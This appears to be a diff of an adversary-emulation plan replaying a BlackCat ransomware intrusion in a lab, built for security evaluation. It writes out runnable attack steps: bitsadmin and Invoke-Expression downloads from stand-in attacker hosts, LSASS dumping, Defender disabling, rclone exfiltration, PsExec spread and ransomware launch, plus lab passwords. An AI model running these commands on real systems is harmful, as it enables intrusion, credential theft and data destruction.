@@ -7,6 +7,7 @@
 * Initiate an RDP session to the Kali attack host `kraken (176.59.1.18)`
 
 * Open a terminal window and start the webdav server:
+
   ```
   sudo rclone serve webdav /srv/http --addr 176.59.1.18:8080
   ```
@@ -14,14 +15,16 @@
 * Ensure the evalsC2server simple file server handler was started. If it hasn't been started in another terminal window, start the evalsC2server, ensuring the following
 handlers are enabled:
   * Simple file server
+
   ```
   cd alphv_blackcat/Resources/control_server
   sudo ./controlServer -c config/msr2_handler_config.yml
   ```
-  
+
 ## Step 1 - Initial Compromise and Discovery
 
 ### :microphone: Voice Track
+
 An Access Broker gains access to a contractor organization which provides the
 BlackCat affiliate with RDP access to a bastion host `kimeramon (10.20.20.11)`
 within the corporate subsidiary network used by the contractor. The BlackCat
@@ -32,9 +35,9 @@ corporate subsidiary network and download ADRecon.ps1.
 The BlackCat affiliate uses ADRecon.ps1 to discover information about the
 Active Directory and corporate network. After analyzing the output of ADRecon,
 the BlackCat affiliate learns the following:
-- NetBNMBackup server `datamon (10.20.10.122)`
-- Linux KVM server `leomon (10.20.10.16)`
-- Server administrators
+* NetBNMBackup server `datamon (10.20.10.122)`
+* Linux KVM server `leomon (10.20.10.16)`
+* Server administrators
 
 ### ☣️ Procedures
 
@@ -49,18 +52,23 @@ host `kimeramon (10.20.20.11)` using the contractor's credentials:
 
 * Within the RDP session to the bastion host `kimeramon (10.20.20.11)`, open
 Edge and browse to:
+
     ```
     https://github.com/sense-of-security/ADRecon/blob/11881a24e9c8b207f31b56846809ce1fb189bcc9/ADRecon.ps1
     ```
-    * Click the download button to "Download raw file" to the Downloads folder
+
+  * Click the download button to "Download raw file" to the Downloads folder
 
 * Open a non-elevated PowerShell and execute ADRecon.ps1:
+
   ```
   cd Downloads
   ```
+
   ```
   Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass
   ```
+
   ```
   .\ADRecon.ps1 -Collect GroupMembers, Computers -OutputType CSV
   ```
@@ -70,11 +78,12 @@ Edge and browse to:
   * Repeat the above for GroupMembers.csv
 
 ### :mag: Reference Code & Reporting
-1. https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf
-1. https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/
-1. https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/
-1. https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/blackcat#prevent
-1. https://www.mandiant.com/resources/blog/alphv-ransomware-backup
+
+1. <https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf>
+1. <https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/>
+1. <https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/>
+1. <https://www.blackberry.com/us/en/solutions/endpoint-security/ransomware-protection/blackcat#prevent>
+1. <https://www.mandiant.com/resources/blog/alphv-ransomware-backup>
 
 <details>
   <summary>:link: Click to expand source code links table</summary>
@@ -86,10 +95,10 @@ Edge and browse to:
   | ----------------- | ---------------- | ---------------- | ------------------- |
   | RDP to bastion host | - | T1078.002 Valid Accounts: Domain Accounts | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
   | RDP to bastion host | - | T1021.001 Remote Services: Remote Desktop Protocol | [Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/) |
-  | Download of ADRecon.ps1 | https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1 | T1105 Ingress Tool Transfer | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
+  | Download of ADRecon.ps1 | <https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1> | T1105 Ingress Tool Transfer | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
   | Open PowerShell | - | T1059.001 Command and Scripting Interpreter: PowerShell | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
-  | Execute ADRecon Get-ADRGroupMember | https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1#L7628 | T1069.002 Permission Groups Discovery: Domain Groups | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
-  | Execute ADRecon Get-ADRComputer | https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1#L8948 | T1018 Remote System Discovery | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
+  | Execute ADRecon Get-ADRGroupMember | <https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1#L7628> | T1069.002 Permission Groups Discovery: Domain Groups | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
+  | Execute ADRecon Get-ADRComputer | <https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1#L8948> | T1018 Remote System Discovery | [HC3](https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf)<br>[Microsoft](https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/)<br>[Cisco](https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/)<br>[Mandiant](https://www.mandiant.com/resources/blog/alphv-ransomware-backup) |
 
 </details>
 
@@ -111,40 +120,44 @@ then RDPs to `datamon (10.20.10.122)` to execute `InfoStealer` against the
 NetBNMBackup server.
 
 The decrypted output contains the plaintext passwords for:
-- The workstation local administrator account `windesk`
-- Linux KVM server administrator account `marakawa`
-- Domain admin account `ykaida.da`
+* The workstation local administrator account `windesk`
+* Linux KVM server administrator account `marakawa`
+* Domain admin account `ykaida.da`
 
 Using the workstation local administrator account `windesk`, the
 BlackCat affiliate uses several methods to attempt to disable anti-virus and
 EDR solutions on the bastion host:
-- Terminate processes and stop anti-virus services via Task Manager
-- Open Windows Security and disable `Real-time protection` in "Virus & threat
+* Terminate processes and stop anti-virus services via Task Manager
+* Open Windows Security and disable `Real-time protection` in "Virus & threat
 protection" settings
-- Open PowerShell and use the `Set-MpPreference` module to disable Defender's
+* Open PowerShell and use the `Set-MpPreference` module to disable Defender's
 `Real-time protection`
 
 ### ☣️ Procedures
 
 * Within the RDP session, search for "SQL Server Management Studio".
-    * In the "Connect to Server" prompt, select `Sql Server Authentication` for the Authentication type, if not already selected
-    * Login as zorimoto (no `DIGIREVENGE`):
+  * In the "Connect to Server" prompt, select `Sql Server Authentication` for the Authentication type, if not already selected
+  * Login as zorimoto (no `DIGIREVENGE`):
+
         | Username | Password |
         | -------- | -------- |
         | zorimoto | tzTVgs44isT4YxWU! |
-    * On the lefthand side, in the `Object Explorer` expand the `Databases` folder.
-    * Next expand `NetBNMBackup` > `Tables` and right-click `dbo.Credentials`, then select `Select Top 1000 Rows`.
-        * Review the rows of data to ensure they are indicative of being an unencrypted, 
+
+  * On the lefthand side, in the `Object Explorer` expand the `Databases` folder.
+  * Next expand `NetBNMBackup` > `Tables` and right-click `dbo.Credentials`, then select `Select Top 1000 Rows`.
+    * Review the rows of data to ensure they are indicative of being an unencrypted,
     encoded-only NetBNMBackup duplicate.
 
 * Open a non-elevated `cmd.exe` as `zorimoto` then execute `BITSAdmin.exe` to download
 InfoStealer from the adversary server
+
   ```
   bitsadmin /transfer defaultjob2 /download http://the-inator.com/digirevenge/netbnmp.exe %TEMP%\netbnmp.exe
   ```
 
 * Execute InfoStealer against the bastion host and confirm output contains
 plaintext credentials for the SQL service account
+
   ```
   %TEMP%\netbnmp.exe base64 localhost zorimoto tzTVgs44isT4YxWU!
   ```
@@ -152,12 +165,14 @@ plaintext credentials for the SQL service account
 * **Within the RDP session**, search for "Remote Desktop Connection" and
 initiate an RDP connection to `datamon (10.20.10.122)` using `zorimoto`'s
 credentials:
+
   | Username | Password |
   | -------- | -------- |
   | DIGIREVENGE\zorimoto | tzTVgs44isT4YxWU! |
 
 * Open a non-elevated `cmd.exe` as `zorimoto` then execute `BITSAdmin.exe` to download
 InfoStealer from the adversary server
+
   ```
   bitsadmin /transfer defaultjob /download http://the-inator.com/digirevenge/netbnmp.exe %TEMP%\netbnmp.exe
   ```
@@ -165,9 +180,10 @@ InfoStealer from the adversary server
 * Execute InfoStealer against the NetBNMBackup SQL server `datamon (10.20.10.122)`
 using `zorimoto`'s credentials and confirm output contains plaintext credentials
 for:
-    * The workstation local administrator account `windesk`
-    * The Linux KVM server administrator account `marakawa`
-    * The domain adminstrator account `ykaida.da`
+  * The workstation local administrator account `windesk`
+  * The Linux KVM server administrator account `marakawa`
+  * The domain adminstrator account `ykaida.da`
+
   ```
   %TEMP%\netbnmp.exe dpapi localhost zorimoto tzTVgs44isT4YxWU!
   ```
@@ -210,10 +226,11 @@ and disable Defender's `Real-time protection` via `Set-MpPreference`
   ```
 
 ### :mag: Reference Code & Reporting
-1. https://www.mandiant.com/resources/blog/alphv-ransomware-backup
-1. https://www.varonis.com/blog/blackcat-ransomware
-1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps
-1. https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/
+
+1. <https://www.mandiant.com/resources/blog/alphv-ransomware-backup>
+1. <https://www.varonis.com/blog/blackcat-ransomware>
+1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps>
+1. <https://blog.checkymander.com/red%20team/veeam/decrypt-veeam-passwords/>
 
 <details>
   <summary>:link: Click to expand source code links table</summary>
@@ -241,6 +258,7 @@ and disable Defender's `Real-time protection` via `Set-MpPreference`
 ## Step 3 - Credential Access for Privilege Escalation
 
 ### :microphone: Voice Track
+
 Using the plaintext credentials retrieved for the workstation local
 administrator account `windesk`, the BlackCat affiliate uses
 the RDP session to the bastion host `kimeramon (10.20.20.11)` to edit the
@@ -259,7 +277,7 @@ credentials when prompted
   | -------- | -------- |
   | .\windesk | windesk |
 
-* Using Registry Editor, enable WDigest by browsing to 
+* Using Registry Editor, enable WDigest by browsing to
 `HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest`, right-click
 inside the window, New > DWORD (32-bit) Value, and type `UseLogonCredential`
 for the registry key value name. Ensure the type says `REG_DWORD`. Then right-
@@ -280,6 +298,7 @@ DMP file has been created (`C:\Users\windesk\AppData\Local\Temp\lsass.DMP`)
 
 * Within the RDP session to the bastion host `kimeramon (10.20.20.11)`, open
 Edge and browse to the following link to initiate the download of rclone:
+
     ```
     https://github.com/rclone/rclone/releases/download/v1.64.0/rclone-v1.64.0-windows-amd64.zip
     ```
@@ -296,14 +315,17 @@ workstation local administrator account credentials when prompted
   | .\windesk | windesk |
 
 * Change directory to the directory containing the rclone executable:
+
   ```
   cd C:\Users\zorimoto\Downloads\rclone-v1.64.0-windows-amd64\rclone-v1.64.0-windows-amd64
   ```
 
 * Using the `cmd.exe` terminal, configure rclone for exfil via WebDAV
+
   ```
   rclone config
   ```
+
   * On entry to the rclone config console, type `n` for "New remote" then press
   Enter
   * For the name of the remote, type `webdav` then press Enter
@@ -318,31 +340,36 @@ workstation local administrator account credentials when prompted
   * For the token, press Enter to leave blank
   * For editing the advanced config, press Enter for "no"
   * Ensure the output configuration confirmation looks like the below
+
     ```
     - type: webdav
     - url: http://luffaplex-dillpickle-inator.com:8080
     - vendor: other
     ```
+
   * For keeping the "webdav" remote, type `y` for "Yes this is OK" and press
   Enter
   * You should now see `webdav` in the table of Current remotes. Type `q` to
   exit the rclone config console.
 
 * Using the `cmd.exe` terminal, exfiltrate the DMP file using rclone
+
   ```
   rclone copy "C:\Users\windesk\AppData\Local\Temp\lsass.DMP" webdav:
   ```
 
 * :arrow_right: Switch to your Kali RDP session and check for the exfiltrated
 lsass.DMP file
+
   ```
   sudo ls -l /srv/http
   ```
 
 ### :mag: Reference Code & Reporting
-1. https://www.mandiant.com/resources/blog/alphv-ransomware-backup
-1. https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/
-1. https://duo.com/decipher/prolific-affiliate-threat-groups-linked-to-blackcat-ransomware
+
+1. <https://www.mandiant.com/resources/blog/alphv-ransomware-backup>
+1. <https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/>
+1. <https://duo.com/decipher/prolific-affiliate-threat-groups-linked-to-blackcat-ransomware>
 
 <details>
   <summary>:link: Click to expand source code links table</summary>
@@ -366,21 +393,22 @@ lsass.DMP file
 ## Step 4 - Collection & Exfiltration
 
 ### :microphone: Voice Track
+
 The BlackCat affiliate downloads `ExMatter` and a network scanning script to
 identify additional targets via PowerShell using the compromised Domain Admin
 account `digirevenge\ykaida.da`. Then, the BlackCat affiliate uses PsExec to execute
 `ExMatter` against the identified targets.
 
 On execution, ExMatter will:
-- Retrieve the drive names of all logical drives and collect all file path
+* Retrieve the drive names of all logical drives and collect all file path
 names
-- Use LastWriteTime to create a queue of files for exfiltration (`ExMatter`
+* Use LastWriteTime to create a queue of files for exfiltration (`ExMatter`
 will only exfiltrate files larger than 1,024 bytes)
-- Upload files from the queue to a remote SFTP server using the parameters:
-  - Host: hide-the-secret-password-inator.net
-  - Port: 22
-- Compresses target files into a zip archive
-- Removes traces of itself by invoking PowerShell to overwrite the first 65,536
+* Upload files from the queue to a remote SFTP server using the parameters:
+  * Host: hide-the-secret-password-inator.net
+  * Port: 22
+* Compresses target files into a zip archive
+* Removes traces of itself by invoking PowerShell to overwrite the first 65,536
 bytes then deleting itself
 
 After remote execution of `ExMatter` has completed, the BlackCat affiliate
@@ -390,6 +418,7 @@ executes ExMatter on the local workstation.
 
 * Open `cmd.exe` (or use an existing cmd.exe running as `zorimoto`) and execute `BITSAdmin.exe` to download
 ExMatter from the adversary server
+
   ```
   bitsadmin /transfer defaultjob4 /download http://the-inator.com/digirevenge/collector1.exe %TEMP%\collector1.exe
   ```
@@ -403,21 +432,26 @@ Domain Admin credentials for `ykaida.da` when prompted
 
 * Using the elevated PowerShell, download and execute the network scanning
 script to identify additional targets
+
   ```
   Invoke-Expression(Invoke-WebRequest 'http://the-inator.com/digirevenge/Empire-port-scan.ps1' -UseBasicParsing)
   ```
+
   ```
   Invoke-Portscan -Hosts "10.20.20.0/24" -ErrorAction SilentlyContinue | where {$_.alive -eq $true}
   ```
+
   ```
   Invoke-Portscan -Hosts "10.20.10.0/24" -ErrorAction SilentlyContinue | where {$_.alive -eq $true}
   ```
 
 * Using the elevated PowerShell, execute ExMatter via PsExec against the
 additional targets
+
   ```
   psexec -c -accepteula \\10.20.20.22,10.20.20.33,10.20.10.4,10.20.10.23,10.20.10.122,10.20.10.200 C:\Users\zorimoto\AppData\Local\Temp\collector1.exe
   ```
+
   * This may take some time, since ExMatter will run on each host one at a time.
 
 * Using File Explorer, browse to `C:\Users\zorimoto\AppData\Local\Temp` and then
@@ -437,9 +471,11 @@ for `ykaida.da` when prompted:
 * :arrow_right: Return to your Kali server and open up a terminal window
 * Run the following command to check for uploaded zip archives:
   * If checking the original scenario steps:
+
     ```
     sudo ls -alR /srv/sftp/sftpupload/uploads/
     ```
+
 * Ensure that for each of the following hostnames, there is a non-empty folder whose name begins with that hostname and has non-empty zip files:
   * alphamon
   * bakemon
@@ -452,11 +488,13 @@ for `ykaida.da` when prompted:
 * ❗ If there are zip archives missing for a given host perform the remaining instructions to fetch ExMatter log files for the host(s).
   * :arrow_right: return to your RDP session to the jumpbox `homelander (116.83.1.29)`
   * From the jumpbox, RDP into the subsidiary B domain controller `blacknoirmon (10.20.10.4)` as `evals_domain_admin`:
+
     | Username | Password |
     | -------- | -------- |
     | digirevenge\evals_domain_admin | axi9eengei9inaeR@ |
 
   * Open up an administrator powershell terminal and execute the following:
+
     ```psh
     $paths=@("C$\Windows\System32\EMBatLog.txt", "C$\Windows\EMBatLog.txt", "C$\Windows\System32\EMlog.txt", "C$\Windows\EMlog.txt");
     $destDir="C:\Users\evals_domain_admin\xelogs";
@@ -489,10 +527,12 @@ for `ykaida.da` when prompted:
     Remove-Item -Recurse -Force "$destDir";
     Remove-Item -Force "$zipPath";
     ```
+
     * When prompted, enter the credentials to Kali for SCP
-      
+
   * Sign out of your RDP session
   * :arrow_right: Switch back to your kali terminal and execute the following to unzip and decrypt the uploaded log files:
+
     ```
     cd
     dirname=exmatter_logs_$(date '+%Y-%m-%dT%H-%M-%S')
@@ -506,18 +546,22 @@ for `ykaida.da` when prompted:
         python3 alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py -i $filename -o dec_$basename -k 0370dd5addcd980e8f4b424c92d8049e99c7c7c5d09eedfcc58f6abca9e72f99 --aes-256-cbc
     done
     ```
+
   * For each of the hosts that were missing zip uploads, check the corresponding decrypted log file to look for errors or signs of unsuccessful/incomplete execution:
+
     ```
     grep -i 'error\|fail' dec_*.log
     ```
+
     * For hosts that had failed uploads but no matches from the `grep` command, you may need to actually go through the log files to look for signs of failure.
 
 ### :mag: Reference Code & Reporting
-1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps
-1. https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration
-1. https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool
-1. https://www.cyderes.com/blog/threat-advisory-exmatter-data-extortion/
-1. https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack
+
+1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-ransomware-ttps>
+1. <https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackmatter-data-exfiltration>
+1. <https://www.kroll.com/en/insights/publications/cyber/analyzing-exmatter-ransomware-data-exfiltration-tool>
+1. <https://www.cyderes.com/blog/threat-advisory-exmatter-data-extortion/>
+1. <https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack>
 
 <details>
   <summary>:link: Click to expand source code links table</summary>
@@ -549,6 +593,7 @@ for `ykaida.da` when prompted:
 ## Step 5 - Payload Deployment
 
 ### :microphone: Voice Track
+
 The BlackCat affliate downloads `BlackCat (Linux)` to the bastion host
 `kimeramon (10.20.20.11)` and uses SCP to copy `BlackCat (Linux)` to the Linux
 KVM server `leomon (10.20.10.16)`, providing the Linux KVM server
@@ -557,15 +602,15 @@ Next, the BlackCat affiliate sends an SSH command to the Linux KVM server
 to execute `BlackCat (Linux)` on the Linux KVM server.
 
 `BlackCat (Linux)` will:
-- Discover system UUID, current username, and current hostname
-- Verify that the target machine is a KVM server
-- Enumerate and stop running virtual machines
-- Enumerate and delete virtual machine snapshots
-- Terminate a pre-defined set of processes and services that may interfere with encryption
-- Enumerate and encrypt virtual machine volumes using AES
-  - Encrypted files are appended with `.skyfl2e` at the end the filename. Ex.
+* Discover system UUID, current username, and current hostname
+* Verify that the target machine is a KVM server
+* Enumerate and stop running virtual machines
+* Enumerate and delete virtual machine snapshots
+* Terminate a pre-defined set of processes and services that may interfere with encryption
+* Enumerate and encrypt virtual machine volumes using AES
+  * Encrypted files are appended with `.skyfl2e` at the end the filename. Ex.
   "[original filename].[extension].skyfl2e"
-  - Place a ransom note in folder(s) containing the encrypted VM volumes
+  * Place a ransom note in folder(s) containing the encrypted VM volumes
 
 ### ☣️ Procedures
 
@@ -574,19 +619,23 @@ to execute `BlackCat (Linux)` on the Linux KVM server.
 > * :arrow_right: initiate an RDP session to the jumpbox `homelander (116.83.1.29)` (if not already open)
 >
 > * Open up powershell and SSH to the KVM server, typing `yes` to continue connecting as the KVM admin:
+>
 >   ```
 >   ssh marakawa@10.20.10.16
 >   ```
+>
 >   | Username | Password |
 >   | -------- | -------- |
 >   | marakawa | cuL9LmnrdnWqbqcA@ |
 >
 > * list all VMs regardless of running state
+>
 >   ```
 >   sudo virsh list --all
 >   ```
 >
 > * list current snapshots for each VM
+>
 >   ```
 >   sudo virsh snapshot-list fedora2
 >   sudo virsh snapshot-list test1
@@ -594,6 +643,7 @@ to execute `BlackCat (Linux)` on the Linux KVM server.
 >   ```
 >
 > * create additional snapshot for each VM
+>
 >   ```
 >   sudo virsh snapshot-create-as fedora2 debugsnapshot --description "debug snapshot"
 >   sudo virsh snapshot-create-as test1 debugsnapshot --description "debug snapshot"
@@ -601,6 +651,7 @@ to execute `BlackCat (Linux)` on the Linux KVM server.
 >   ```
 >
 > * enumerate snapshots again
+>
 >   ```
 >   sudo virsh snapshot-list fedora2
 >   sudo virsh snapshot-list test1
@@ -608,6 +659,7 @@ to execute `BlackCat (Linux)` on the Linux KVM server.
 >   ```
 >
 > * start VMs
+>
 >   ```
 >   sudo virsh start fedora2
 >   sudo virsh start test1
@@ -615,11 +667,13 @@ to execute `BlackCat (Linux)` on the Linux KVM server.
 >   ```
 >
 > * check VM state again
+>
 >   ```
 >   sudo virsh list
 >   ```
 >
 > * terminate SSH session
+>
 >   ```
 >   exit
 >   ```
@@ -631,6 +685,7 @@ to execute `BlackCat (Linux)` on the Linux KVM server.
 * Open `cmd.exe` (or use an existing cmd.exe running as `zorimoto`) and execute `BITSAdmin.exe` to download
 BlackCat (Linux) to the bastion host `kimeramon (10.20.20.11)` from the
 adversary server
+
   ```
   bitsadmin /transfer defaultjob5 /download http://the-inator.com/digirevenge/digirevenge %TEMP%\digirevenge
   ```
@@ -638,16 +693,18 @@ adversary server
 * Open PowerShell (non-elevated) and SCP BlackCat to the Linux KVM server
 `leomon (10.20.10.16)`, typing `yes` to continue connecting, providing the
 Linux KVM server administrator credentials `marakawa` when prompted
+
   ```
   scp $Env:temp\digirevenge marakawa@10.20.10.16:/tmp/digirevenge
   ```
-  
+
   | Password |
   | -------- |
   | cuL9LmnrdnWqbqcA@ |
 
 * Using PowerShell, execute BlackCat via SSH command to the Linux KVM server,
 providing the Linux KVM server administrator credentials when prompted
+
   ```
   ssh -t marakawa@10.20.10.16 "chmod +x /tmp/digirevenge && sudo /tmp/digirevenge --access-token 15742aa362a84ba3"
   ```
@@ -657,36 +714,42 @@ providing the Linux KVM server administrator credentials when prompted
   | cuL9LmnrdnWqbqcA@ |
 
 #### Verifying BlackCat (Linux) Logs
+
 * :arrow_right: Return to your Kali server and open up a terminal window
 
 * Execute the following to copy the BlackCat Linux logs from the KVM server as `evals_domain_admin`, typing `yes` to continue the connection:
+
   ```
   cd
   scp evals_domain_admin@10.20.10.16:/home/marakawa/bc.log ~/kvm.log
   ```
+
   | Password |
   | -------- |
   | axi9eengei9inaeR@ |
 
 * Execute the following in the kali terminal to decrypt and inspect the logs:
+
   ```
   python3 alphv_blackcat/Resources/log_decryptor/aes_base64_log_decryptor.py -i ~/kvm.log -o ~/dec_kvm.log --aes-128-ctr -k 4a99bcca87318b844be7928cd98e23f9;
   cat ~/dec_kvm.log
   ```
+
   * Ensure that the logs show evidence of successful encryption activity and VM tampering.
 
 ### :mag: Reference Code & Reporting
-1. https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware
-1. https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack
-1. https://www.mandiant.com/resources/blog/alphv-ransomware-backup
-1. https://unit42.paloaltonetworks.com/blackcat-ransomware/#Technical-Details
-1. https://assets.sophos.com/X24WTUEQ/at/q6r6n3x43mnrfchn5tfh3qmw/sophos-x-ops-active-adversary-multiple-attackers-wp.pdf
-1. https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/
-1. https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware
-1. https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/
-1. https://www.varonis.com/blog/blackcat-ransomware
-1. https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/'https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware
-1. https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf
+
+1. <https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware>
+1. <https://www.netskope.com/blog/blackcat-ransomware-tactics-and-techniques-from-a-targeted-attack>
+1. <https://www.mandiant.com/resources/blog/alphv-ransomware-backup>
+1. <https://unit42.paloaltonetworks.com/blackcat-ransomware/#Technical-Details>
+1. <https://assets.sophos.com/X24WTUEQ/at/q6r6n3x43mnrfchn5tfh3qmw/sophos-x-ops-active-adversary-multiple-attackers-wp.pdf>
+1. <https://blog.talosintelligence.com/from-blackmatter-to-blackcat-analyzing/>
+1. <https://cybersecurity.att.com/blogs/labs-research/blackcat-ransomware>
+1. <https://news.sophos.com/en-us/2022/07/14/blackcat-ransomware-attacks-not-merely-a-byproduct-of-bad-luck/>
+1. <https://www.varonis.com/blog/blackcat-ransomware>
+1. <https://www.microsoft.com/en-us/security/blog/2022/06/13/the-many-lives-of-blackcat-ransomware/'https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/noberus-blackcat-alphv-rust-ransomware>
+1. <https://www.hhs.gov/sites/default/files/blackcat-analyst-note.pdf>
 
 <details>
   <summary>:link: Click to expand source code links table</summary>
@@ -705,11 +768,11 @@ providing the Linux KVM server administrator credentials when prompted
   | Execute chmod to make BlackCat (Linux) executable | - | T1222 File and Directory Permissions Modification | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
   | Execute BlackCat (Linux) on Linux server | - | T1021.004 Remote Services: SSH | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
   | BlackCat (Linux) enumerates VMs | [get_vms](../Resources/blackcat/src/kvm.rs#L178) | T1057 Process Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
-  | BlackCat (Linux) stops VMs | [shutdown_vm](../Resources/blackcat/src/kvm.rs#L360) | T1489 Service Stop | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) | 
-  | BlackCat (Linux) enumerates snapshots | [get_vm_snapshots](../Resources/blackcat/src/kvm.rs#L268) | T1083 File and Directory Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) | 
-  | BlackCat (Linux) deletes snapshots | [delete_snapshot](../Resources/blackcat/src/kvm.rs#L314) | T1490 Inhibit System Recovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) | 
+  | BlackCat (Linux) stops VMs | [shutdown_vm](../Resources/blackcat/src/kvm.rs#L360) | T1489 Service Stop | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
+  | BlackCat (Linux) enumerates snapshots | [get_vm_snapshots](../Resources/blackcat/src/kvm.rs#L268) | T1083 File and Directory Discovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
+  | BlackCat (Linux) deletes snapshots | [delete_snapshot](../Resources/blackcat/src/kvm.rs#L314) | T1490 Inhibit System Recovery | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
   | BlackCat (Linux) terminates processes | [killall_by_name](../Resources/blackcat/src/proc.rs#L79) | T1489 Service Stop | [Microsoft](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB) |
-  | BlackCat (Linux) terminates services | [terminate_services](../Resources/blackcat/src/service.rs#L239) | T1489 Service Stop | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) | 
+  | BlackCat (Linux) terminates services | [terminate_services](../Resources/blackcat/src/service.rs#L239) | T1489 Service Stop | [Varonis](https://www.varonis.com/blog/blackcat-ransomware) |
   | BlackCat (Linux) enumerates VM volumes | [get_volume_paths](../Resources/blackcat/src/kvm.rs#L225) | T1083 File and Directory Discovery | [Microsoft](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB) |
   | BlackCat (Linux) encrypts VM volumes | [encrypt_volumes](../Resources/blackcat/src/kvm.rs#L31) | T1486 Data Encrypted for Impact | [Microsoft](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Ransom:Linux/BlackCat.A!MTB) |
